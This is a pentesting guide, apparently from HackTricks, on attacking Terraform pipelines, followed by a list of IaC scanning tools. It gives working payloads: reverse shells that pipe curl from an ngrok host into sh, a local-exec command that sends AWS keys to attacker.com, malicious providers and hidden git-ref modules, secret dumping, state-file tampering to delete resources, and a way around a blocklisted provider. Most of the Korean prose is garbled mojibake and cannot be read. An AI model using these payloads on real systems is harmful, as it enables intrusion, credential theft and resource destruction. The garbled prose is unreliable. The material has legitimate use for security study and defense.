# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Basic Information

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraformì€ **ì½”ë“œë¡œì„œì˜ ì¸í”„ë¼ ë„êµ¬**ë¡œ, ì¸ê°„ì´ ì½ì„ ìˆ˜ ìˆëŠ” êµ¬ì„± íŒŒì¼ì—ì„œ **í´ë¼ìš°ë“œ ë° ì˜¨í”„ë ˆë¯¸ìŠ¤ ë¦¬ì†ŒìŠ¤**ë¥¼ ì •ì˜í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤. ì´ëŸ¬í•œ íŒŒì¼ì€ ë²„ì „ ê´€ë¦¬, ì¬ì‚¬ìš© ë° ê³µìœ ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ì¼ê´€ëœ ì›Œí¬í”Œë¡œë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸í”„ë¼ì˜ ì „ì²´ ìˆ˜ëª… ì£¼ê¸° ë™ì•ˆ ëª¨ë“  ì¸í”„ë¼ë¥¼ í”„ë¡œë¹„ì €ë‹í•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Terraformì€ ì»´í“¨íŠ¸, ìŠ¤í† ë¦¬ì§€ ë° ë„¤íŠ¸ì›Œí‚¹ ë¦¬ì†ŒìŠ¤ì™€ ê°™ì€ ì €ìˆ˜ì¤€ êµ¬ì„± ìš”ì†Œë¿ë§Œ ì•„ë‹ˆë¼ DNS í•­ëª© ë° SaaS ê¸°ëŠ¥ê³¼ ê°™ì€ ê³ ìˆ˜ì¤€ êµ¬ì„± ìš”ì†Œë¥¼ ê´€ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Terraformì€ ì–´ë–»ê²Œ ì‘ë™í•˜ë‚˜ìš”?

Terraformì€ í´ë¼ìš°ë“œ í”Œë«í¼ ë° ê¸°íƒ€ ì„œë¹„ìŠ¤ì—ì„œ ë¦¬ì†ŒìŠ¤ë¥¼ ìƒì„±í•˜ê³  ê´€ë¦¬í•˜ê¸° ìœ„í•´ ì• í”Œë¦¬ì¼€ì´ì…˜ í”„ë¡œê·¸ë˜ë° ì¸í„°í˜ì´ìŠ¤(API)ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. í”„ë¡œë°”ì´ë”ëŠ” Terraformì´ ì ‘ê·¼ ê°€ëŠ¥í•œ APIê°€ ìˆëŠ” ê±°ì˜ ëª¨ë“  í”Œë«í¼ì´ë‚˜ ì„œë¹„ìŠ¤ì™€ ì‘ì—…í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

![](<../images/image (177).png>)

HashiCorpì™€ Terraform ì»¤ë®¤ë‹ˆí‹°ëŠ” ì´ë¯¸ **1700ê°œ ì´ìƒì˜ í”„ë¡œë°”ì´ë”**ë¥¼ ì‘ì„±í•˜ì—¬ ìˆ˜ì²œ ê°€ì§€ ìœ í˜•ì˜ ë¦¬ì†ŒìŠ¤ì™€ ì„œë¹„ìŠ¤ë¥¼ ê´€ë¦¬í•˜ê³  ìˆìœ¼ë©°, ì´ ìˆ«ìëŠ” ê³„ì† ì¦ê°€í•˜ê³  ìˆìŠµë‹ˆë‹¤. ëª¨ë“  ê³µê°œ í”„ë¡œë°”ì´ë”ëŠ” [Terraform Registry](https://registry.terraform.io/)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì—ëŠ” Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog ë“±ì´ í¬í•¨ë©ë‹ˆë‹¤.

í•µì‹¬ Terraform ì›Œí¬í”Œë¡œëŠ” ì„¸ ê°€ì§€ ë‹¨ê³„ë¡œ êµ¬ì„±ë©ë‹ˆë‹¤:

- **ì‘ì„±:** ì—¬ëŸ¬ í´ë¼ìš°ë“œ í”„ë¡œë°”ì´ë” ë° ì„œë¹„ìŠ¤ì— ê±¸ì³ ë¦¬ì†ŒìŠ¤ë¥¼ ì •ì˜í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë³´ì•ˆ ê·¸ë£¹ê³¼ ë¡œë“œ ë°¸ëŸ°ì„œê°€ ìˆëŠ” ê°€ìƒ ì‚¬ì„¤ í´ë¼ìš°ë“œ(VPC) ë„¤íŠ¸ì›Œí¬ì˜ ê°€ìƒ ë¨¸ì‹ ì— ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë°°í¬í•˜ê¸° ìœ„í•œ êµ¬ì„±ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **ê³„íš:** Terraformì€ ê¸°ì¡´ ì¸í”„ë¼ì™€ êµ¬ì„±ì— ë”°ë¼ ìƒì„±, ì—…ë°ì´íŠ¸ ë˜ëŠ” ì‚­ì œí•  ì¸í”„ë¼ë¥¼ ì„¤ëª…í•˜ëŠ” ì‹¤í–‰ ê³„íšì„ ìƒì„±í•©ë‹ˆë‹¤.
- **ì ìš©:** ìŠ¹ì¸ì´ ì´ë£¨ì–´ì§€ë©´ Terraformì€ ë¦¬ì†ŒìŠ¤ ì¢…ì†ì„±ì„ ì¡´ì¤‘í•˜ë©° ì œì•ˆëœ ì‘ì—…ì„ ì˜¬ë°”ë¥¸ ìˆœì„œë¡œ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, VPCì˜ ì†ì„±ì„ ì—…ë°ì´íŠ¸í•˜ê³  í•´ë‹¹ VPCì˜ ê°€ìƒ ë¨¸ì‹  ìˆ˜ë¥¼ ë³€ê²½í•˜ë©´ Terraformì€ ê°€ìƒ ë¨¸ì‹ ì„ í™•ì¥í•˜ê¸° ì „ì— VPCë¥¼ ì¬ìƒì„±í•©ë‹ˆë‹¤.

![](<../images/image (215).png>)

### Terraform Lab

ì»´í“¨í„°ì— terraformì„ ì„¤ì¹˜í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤.

ì—¬ê¸°ì—ì„œ [ê°€ì´ë“œ](https://learn.hashicorp.com/tutorials/terraform/install-cli)ë¥¼ í™•ì¸í•˜ê³ , ì—¬ê¸°ì—ì„œ terraformì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” [ìµœê³ ì˜ ë°©ë²•](https://www.terraform.io/downloads)ì„ í™•ì¸í•˜ì„¸ìš”.

## RCE in Terraform

Terraformì€ **ì›¹ í˜ì´ì§€ë‚˜ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ë¥¼ ë…¸ì¶œí•˜ëŠ” í”Œë«í¼ì´ ì—†ìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ terraformì„ ì†ìƒì‹œí‚¤ëŠ” ìœ ì¼í•œ ë°©ë²•ì€ **terraform êµ¬ì„± íŒŒì¼ì„ ì¶”ê°€/ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥**ì…ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ terraformì€ **ì†ìƒì‹œí‚¤ê¸° ë§¤ìš° ë¯¼ê°í•œ êµ¬ì„± ìš”ì†Œ**ì…ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì œëŒ€ë¡œ ì‘ë™í•˜ê¸° ìœ„í•´ **íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤**ë¥¼ ë‹¤ì–‘í•œ ìœ„ì¹˜ì— ê°€ì ¸ì•¼ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ê³µê²©ìê°€ terraformì´ ì‹¤í–‰ë˜ëŠ” ì‹œìŠ¤í…œì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” ì£¼ìš” ë°©ë²•ì€ **terraform êµ¬ì„±ì„ ì €ì¥í•˜ëŠ” ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì†ìƒì‹œí‚¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ì™œëƒí•˜ë©´ ì–¸ì  ê°€ëŠ” ì´ë“¤ì´ **í•´ì„ë ** ê²ƒì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ì‹¤ì œë¡œ PRì´ ìƒì„±ëœ í›„ **terraform plan/applyë¥¼ ìë™ìœ¼ë¡œ ì‹¤í–‰í•˜ëŠ”** ì†”ë£¨ì…˜ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ **Atlantis**ê°€ ìˆìŠµë‹ˆë‹¤:

{{#ref}}
atlantis-security.md
{{#endref}}

terraform íŒŒì¼ì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆë‹¤ë©´, ëˆ„êµ°ê°€ `terraform plan` ë˜ëŠ” `terraform apply`ë¥¼ ì‹¤í–‰í•  ë•Œ RCEë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

### Terraform plan

Terraform planì€ terraformì—ì„œ **ê°€ì¥ ë§ì´ ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì–´**ì´ë©°, terraformì„ ì‚¬ìš©í•˜ëŠ” ê°œë°œì/ì†”ë£¨ì…˜ì€ ì´ë¥¼ í•­ìƒ í˜¸ì¶œí•©ë‹ˆë‹¤. ë”°ë¼ì„œ **RCEë¥¼ ì–»ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•**ì€ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  terraform êµ¬ì„± íŒŒì¼ì„ ì˜¤ì—¼ì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

**ì™¸ë¶€ í”„ë¡œë°”ì´ë” ì‚¬ìš©í•˜ê¸°**

Terraformì€ Terraformê³¼ ì™¸ë¶€ í”„ë¡œê·¸ë¨ ê°„ì˜ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” [`external` í”„ë¡œë°”ì´ë”](https://registry.terraform.io/providers/hashicorp/external/latest/docs)ë¥¼ ì œê³µí•©ë‹ˆë‹¤. `plan` ì¤‘ì— ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ `external` ë°ì´í„° ì†ŒìŠ¤ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

terraform êµ¬ì„± íŒŒì¼ì— ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ ì£¼ì…í•˜ë©´ `terraform plan`ì„ ì‹¤í–‰í•  ë•Œ rev shellì´ ì‹¤í–‰ë©ë‹ˆë‹¤:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**ì‚¬ìš©ì ì •ì˜ ì œê³µì ì‚¬ìš©í•˜ê¸°**

ê³µê²©ìëŠ” [Terraform Registry](https://registry.terraform.io/)ì— [ì‚¬ìš©ì ì •ì˜ ì œê³µì](https://learn.hashicorp.com/tutorials/terraform/provider-setup)ë¥¼ ì „ì†¡í•œ ë‹¤ìŒ ê¸°ëŠ¥ ë¸Œëœì¹˜ì˜ Terraform ì½”ë“œì— ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ([ì—¬ê¸°ì—ì„œì˜ ì˜ˆ](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
The provider is downloaded in the `init` and will run the malicious code when `plan` is executed

You can find an example in [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**ì™¸ë¶€ ì°¸ì¡° ì‚¬ìš©í•˜ê¸°**

ë‘ ê°€ì§€ ì–¸ê¸‰ëœ ì˜µì…˜ì€ ìœ ìš©í•˜ì§€ë§Œ ê·¸ë¦¬ ì€ë°€í•˜ì§€ëŠ” ì•ŠìŠµë‹ˆë‹¤ (ë‘ ë²ˆì§¸ëŠ” ë” ì€ë°€í•˜ì§€ë§Œ ì²« ë²ˆì§¸ë³´ë‹¤ ë” ë³µì¡í•©ë‹ˆë‹¤). ë‹¤ìŒ ì œì•ˆì„ ë”°ë¥´ë©´ **ë” ì€ë°€í•œ ë°©ë²•**ìœ¼ë¡œ ì´ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- terraform íŒŒì¼ì— rev shellì„ ì§ì ‘ ì¶”ê°€í•˜ëŠ” ëŒ€ì‹ , rev shellì„ í¬í•¨í•˜ëŠ” **ì™¸ë¶€ ë¦¬ì†ŒìŠ¤**ë¥¼ **ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- ì™¸ë¶€ ë¦¬ì†ŒìŠ¤ì—ì„œ **ref** ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ì—¬ **ë ˆí¬ì˜ ë¸Œëœì¹˜ì— ìˆëŠ” terraform rev shell ì½”ë“œë¥¼ ìˆ¨ê¸°ì„¸ìš”**, ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ìœ¼ë¡œ: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform applyëŠ” ëª¨ë“  ë³€ê²½ ì‚¬í•­ì„ ì ìš©í•˜ê¸° ìœ„í•´ ì‹¤í–‰ë©ë‹ˆë‹¤. ë˜í•œ **ì•…ì„± Terraform íŒŒì¼ì„ ì£¼ì…í•˜ì—¬ RCEë¥¼ ì–»ê¸° ìœ„í•´ ë‚¨ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
ë‹¤ìŒê³¼ ê°™ì€ í˜ì´ë¡œë“œê°€ `main.tf` íŒŒì¼ì— í¬í•¨ë˜ë„ë¡ í•´ì•¼ í•©ë‹ˆë‹¤:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Follow the **suggestions from the previous technique** the perform this attack in a **stealthier way using external references**.

## Secrets Dumps

You can have **secret values used by terraform dumped** running `terraform apply` by adding to the terraform file something like:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform ìƒíƒœ íŒŒì¼ ì•…ìš©

terraform ìƒíƒœ íŒŒì¼ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œì´ ìˆì§€ë§Œ terraform ì½”ë“œë¥¼ ë³€ê²½í•  ìˆ˜ ì—†ëŠ” ê²½ìš°, [**ì´ ì—°êµ¬**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)ëŠ” íŒŒì¼ì„ í™œìš©í•  ìˆ˜ ìˆëŠ” í¥ë¯¸ë¡œìš´ ì˜µì…˜ì„ ì œê³µí•©ë‹ˆë‹¤:

### ë¦¬ì†ŒìŠ¤ ì‚­ì œ <a href="#deleting-resources" id="deleting-resources"></a>

ë¦¬ì†ŒìŠ¤ë¥¼ íŒŒê´´í•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤:

1. **ì‹¤ì œ ì‚­ì œí•  ë¦¬ì†ŒìŠ¤ë¥¼ ê°€ë¦¬í‚¤ëŠ” ì„ì˜ì˜ ì´ë¦„ìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ë¥¼ ìƒíƒœ íŒŒì¼ì— ì‚½ì…í•˜ê¸°**

terraformì€ í•´ë‹¹ ë¦¬ì†ŒìŠ¤ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•„ì•¼ í•œë‹¤ê³  íŒë‹¨í•˜ë¯€ë¡œ, ì´ë¥¼ íŒŒê´´í•  ê²ƒì…ë‹ˆë‹¤(ì§€ì •ëœ ì‹¤ì œ ë¦¬ì†ŒìŠ¤ IDë¥¼ ë”°ë¦…ë‹ˆë‹¤). ì´ì „ í˜ì´ì§€ì˜ ì˜ˆ:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **ì—…ë°ì´íŠ¸í•  ìˆ˜ ì—†ëŠ” ë°©ì‹ìœ¼ë¡œ ì‚­ì œí•  ë¦¬ì†ŒìŠ¤ë¥¼ ìˆ˜ì •í•©ë‹ˆë‹¤ (ê·¸ë˜ì„œ ì‚­ì œë˜ê³  ë‹¤ì‹œ ìƒì„±ë©ë‹ˆë‹¤)**

EC2 ì¸ìŠ¤í„´ìŠ¤ì˜ ê²½ìš°, ì¸ìŠ¤í„´ìŠ¤ ìœ í˜•ì„ ìˆ˜ì •í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ terraformì´ ì‚­ì œí•˜ê³  ë‹¤ì‹œ ìƒì„±í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### RCE

[ì»¤ìŠ¤í…€ í”„ë¡œë°”ì´ë”ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) ê·¸ë¦¬ê³  terraform ìƒíƒœ íŒŒì¼ì—ì„œ ì•…ì„± í”„ë¡œë°”ì´ë”ë¡œ í•˜ë‚˜ì˜ í”„ë¡œë°”ì´ë”ë¥¼ êµì²´í•˜ê±°ë‚˜ ì•…ì„± í”„ë¡œë°”ì´ë”ë¡œ ë¹ˆ ë¦¬ì†ŒìŠ¤ë¥¼ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›ë˜ ì—°êµ¬ì˜ ì˜ˆ:
```json
"resources": [
{
"mode": "managed",
"type": "scaffolding_example",
"name": "example",
"provider": "provider[\"registry.terraform.io/dagrz/terrarizer\"]",
"instances": [

]
},
```
### ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ìˆëŠ” í”„ë¡œë°”ì´ë” êµì²´

`hashicorp/external`ì´ ë¸”ë™ë¦¬ìŠ¤íŠ¸ì— ìˆëŠ” ìƒí™©ì— ì§ë©´í•œ ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì´ `external` í”„ë¡œë°”ì´ë”ë¥¼ ì¬êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì°¸ê³ : ìš°ë¦¬ëŠ” https://registry.terraform.io/providers/nazarewk/external/latestì—ì„œ ê²Œì‹œëœ external í”„ë¡œë°”ì´ë”ì˜ í¬í¬ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë‹¹ì‹ ë„ ìì‹ ì˜ í¬í¬ë‚˜ ì¬êµ¬í˜„ì„ ê²Œì‹œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
ê·¸ëŸ° ë‹¤ìŒ ì¼ë°˜ì ìœ¼ë¡œ `external`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## ìë™ ê°ì‚¬ ë„êµ¬

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snykì€ Terraform, CloudFormation, Kubernetes ë° ê¸°íƒ€ IaC í˜•ì‹ì—ì„œ ì·¨ì•½ì ê³¼ ì˜ëª»ëœ êµ¬ì„±ì„ ê°ì§€í•˜ëŠ” í¬ê´„ì ì¸ Infrastructure as Code (IaC) ìŠ¤ìº” ì†”ë£¨ì…˜ì„ ì œê³µí•©ë‹ˆë‹¤.

- **ê¸°ëŠ¥:**
- ë³´ì•ˆ ì·¨ì•½ì  ë° ê·œì • ì¤€ìˆ˜ ë¬¸ì œì— ëŒ€í•œ ì‹¤ì‹œê°„ ìŠ¤ìº”.
- ë²„ì „ ê´€ë¦¬ ì‹œìŠ¤í…œ(GitHub, GitLab, Bitbucket)ê³¼ì˜ í†µí•©.
- ìë™ ìˆ˜ì • í’€ ìš”ì²­.
- ìƒì„¸í•œ ìˆ˜ì • ì¡°ì–¸.
- **ê°€ì…í•˜ê¸°:** [Snyk](https://snyk.io/)ì—ì„œ ê³„ì •ì„ ë§Œë“œì„¸ìš”.
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov**ëŠ” ì½”ë“œë¡œì„œì˜ ì¸í”„ë¼(IaC)ë¥¼ ìœ„í•œ ì •ì  ì½”ë“œ ë¶„ì„ ë„êµ¬ì´ì ì´ë¯¸ì§€ ë° ì˜¤í”ˆ ì†ŒìŠ¤ íŒ¨í‚¤ì§€ë¥¼ ìœ„í•œ ì†Œí”„íŠ¸ì›¨ì–´ êµ¬ì„± ë¶„ì„(SCA) ë„êµ¬ì…ë‹ˆë‹¤.

ì´ ë„êµ¬ëŠ” [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md) ë˜ëŠ” [OpenTofu](https://opentofu.org/)ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œë¹„ì €ë‹ëœ í´ë¼ìš°ë“œ ì¸í”„ë¼ë¥¼ ìŠ¤ìº”í•˜ê³  ê·¸ë˜í”„ ê¸°ë°˜ ìŠ¤ìº”ì„ í†µí•´ ë³´ì•ˆ ë° ì»´í”Œë¼ì´ì–¸ìŠ¤ ì˜ëª» êµ¬ì„±ëœ ì‚¬í•­ì„ ê°ì§€í•©ë‹ˆë‹¤.

ì´ ë„êµ¬ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ íŒ¨í‚¤ì§€ ë° ì´ë¯¸ì§€ì— ëŒ€í•œ ì¼ë°˜ ì·¨ì•½ì  ë° ë…¸ì¶œ(CVEs)ì„ ìŠ¤ìº”í•˜ëŠ” [ì†Œí”„íŠ¸ì›¨ì–´ êµ¬ì„± ë¶„ì„(SCA) ìŠ¤ìº”](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md)ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance`ëŠ” ì¸í”„ë¼ìŠ¤íŠ¸ëŸ­ì²˜-ì½”ë“œì— ëŒ€í•œ ë¶€ì • í…ŒìŠ¤íŠ¸ ê¸°ëŠ¥ì„ í™œì„±í™”í•˜ê¸° ìœ„í•´ terraformì— ëŒ€í•œ ê²½ëŸ‰ì˜ ë³´ì•ˆ ë° ì¤€ìˆ˜ ì¤‘ì‹¬ í…ŒìŠ¤íŠ¸ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤.

- **compliance:** êµ¬í˜„ëœ ì½”ë“œê°€ ë³´ì•ˆ í‘œì¤€ ë° ì‚¬ìš©ì ì •ì˜ í‘œì¤€ì„ ë”°ë¥´ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
- **behaviour driven development:** ê±°ì˜ ëª¨ë“  ê²ƒì— ëŒ€í•´ BDDê°€ ìˆëŠ”ë°, IaCì— ëŒ€í•´ì„œëŠ” ì™œ ì•ˆ ë ê¹Œìš”?
- **portable:** `pip`ì—ì„œ ì„¤ì¹˜í•˜ê±°ë‚˜ `docker`ë¥¼ í†µí•´ ì‹¤í–‰í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤. [ì„¤ì¹˜](https://terraform-compliance.com/pages/installation/)ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.
- **pre-deploy:** ë°°í¬ë˜ê¸° ì „ì— ì½”ë“œë¥¼ ê²€ì¦í•©ë‹ˆë‹¤.
- **easy to integrate:** ëª¨ë“  ë°°í¬ê°€ ê²€ì¦ë˜ë„ë¡ íŒŒì´í”„ë¼ì¸(ë˜ëŠ” git í›„í¬)ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **segregation of duty:** ë³„ë„ì˜ íŒ€ì´ ì±…ì„ì§€ëŠ” ë‹¤ë¥¸ ë¦¬í¬ì§€í† ë¦¬ì— í…ŒìŠ¤íŠ¸ë¥¼ ë³´ê´€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> [!NOTE]
> ë¶ˆí–‰íˆë„ ì½”ë“œê°€ ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” ì¼ë¶€ ê³µê¸‰ìë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´ `terraform plan`ì„ ìˆ˜í–‰í•˜ê³  ì´ ë„êµ¬ë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsecëŠ” ì ì¬ì ì¸ ì˜ëª»ëœ êµ¬ì„±ì„ ë°œê²¬í•˜ê¸° ìœ„í•´ terraform ì½”ë“œë¥¼ ì •ì  ë¶„ì„í•©ë‹ˆë‹¤.

- â˜ï¸ ëª¨ë“  ì£¼ìš” (ë° ì¼ë¶€ ë¶€ìˆ˜ì ì¸) í´ë¼ìš°ë“œ ì œê³µì—…ì²´ì—ì„œ ì˜ëª»ëœ êµ¬ì„±ì„ í™•ì¸í•©ë‹ˆë‹¤.
- â›” ìˆ˜ë°± ê°œì˜ ë‚´ì¥ ê·œì¹™
- ğŸª† ëª¨ë“ˆ ìŠ¤ìº” (ë¡œì»¬ ë° ì›ê²©)
- â• HCL í‘œí˜„ì‹ê³¼ ë¦¬í„°ëŸ´ ê°’ì„ í‰ê°€í•©ë‹ˆë‹¤.
- â†ªï¸ Terraform í•¨ìˆ˜ ì˜ˆ: `concat()`ë¥¼ í‰ê°€í•©ë‹ˆë‹¤.
- ğŸ”— Terraform ë¦¬ì†ŒìŠ¤ ê°„ì˜ ê´€ê³„ë¥¼ í‰ê°€í•©ë‹ˆë‹¤.
- ğŸ§° Terraform CDKì™€ í˜¸í™˜ë©ë‹ˆë‹¤.
- ğŸ™… ì‚¬ìš©ì ì •ì˜ Rego ì •ì±…ì„ ì ìš©í•˜ê³  (ì¥ì‹í•©ë‹ˆë‹¤).
- ğŸ“ƒ ì—¬ëŸ¬ ì¶œë ¥ í˜•ì‹ì„ ì§€ì›í•©ë‹ˆë‹¤: lovely (ê¸°ë³¸ê°’), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ êµ¬ì„± ê°€ëŠ¥ (CLI í”Œë˜ê·¸ ë°/ë˜ëŠ” êµ¬ì„± íŒŒì¼ì„ í†µí•´)
- âš¡ ë§¤ìš° ë¹ ë¥´ë©°, ëŒ€ê·œëª¨ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì‹ ì†í•˜ê²Œ ìŠ¤ìº”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
brew install tfsec
tfsec /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

**KICS**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¸í”„ë¼ ì½”ë“œì˜ ê°œë°œ ì£¼ê¸° ì´ˆê¸°ì— ë³´ì•ˆ ì·¨ì•½ì , ì»´í”Œë¼ì´ì–¸ìŠ¤ ë¬¸ì œ ë° ì¸í”„ë¼ êµ¬ì„± ì˜¤ë¥˜ë¥¼ ì°¾ì•„ë³´ì„¸ìš”.

